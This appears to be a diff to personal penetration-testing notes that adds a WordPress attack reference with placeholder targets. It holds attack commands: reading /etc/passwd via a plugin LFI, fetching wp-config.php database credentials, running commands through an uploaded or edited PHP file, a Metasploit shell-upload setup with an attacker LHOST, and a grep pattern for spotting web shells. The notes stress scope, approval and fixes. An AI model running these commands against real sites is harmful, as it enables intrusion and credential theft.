@@ -65,6 +65,52 @@ curl -s <URL>/wp-content/uploads/               # open directory listing?
 
 > Brute-force and credential attacks are intrusive — scope + approval only. `wp-config.php` being readable = critical finding (DB creds).
 
+## WordPress — attacking (reference)
+Target placeholder `<URL>`, attacker IP `<LHOST>`. All of this is intrusive — authenticated/exploitation actions need scope + approval.
+
+### Authenticated code exec via theme editor
+With admin access, an editable theme PHP file (e.g. `404.php`) can be made to run commands — classic admin-to-RCE path. Fix: disable the file editor (`DISALLOW_FILE_EDIT`).
+```bash
+curl "<URL>/wp-content/themes/<theme>/404.php?0=id"   # after injecting a cmd param into the file
+```
+
+### Metasploit admin shell upload (needs valid admin creds)
+```text
+use exploit/unix/webapp/wp_admin_shell_upload
+set RHOSTS <IP>        # set VHOST <URL> if vhost-based
+set USERNAME <user>    # set PASSWORD <pass>
+set LHOST <LHOST>
+run
+```
+
+### Known plugin vulns (version-dependent)
+```bash
+# mail-masta LFI
+curl -s "<URL>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+# wpDiscuz unauthenticated RCE (CVE-2020-24186) — public PoC uploads a shell, then:
+curl -s "<URL>/wp-content/uploads/<year>/<month>/<uploaded>.php?cmd=id"
+```
+Always map plugin + version from enum, then check Exploit-DB / searchsploit for a matching PoC.
+
+### User enumeration via REST API
+```bash
+curl -s <URL>/wp-json/wp/v2/users      # often leaks usernames even when login is hardened
+```
+
+### XML-RPC brute force
+`system.multicall` lets many credential guesses ride in one request, amplifying brute force. Public scripts automate it against `xmlrpc.php`. Fix: disable or restrict xmlrpc.php.
+
+### wp-config.php exposure
+```bash
+curl -s <URL>/wp-config.php            # readable = DB creds exposed = critical
+```
+
+### Web shell obfuscation (concept, for recognition & reporting)
+Attackers rarely drop a plaintext shell. A common pattern wraps the payload in `base64_decode()` fed to `eval()`, so the file looks like a harmless blob but decodes at runtime to a command-executing one-liner. Why it matters for me:
+- **Detecting it:** grep uploaded/content dirs for `eval(`, `base64_decode(`, `assert(`, `system(`, `gzinflate(` in `.php` files; flag recently modified files in `wp-content/uploads/`.
+- **Reporting it:** note the obfuscation as an IOC and recommend file-integrity monitoring + blocking PHP execution in upload dirs.
+I don't store working shell payloads in this repo.
+
 ### My notes / lab output
 Filled in once I run this on a WordPress target.
 
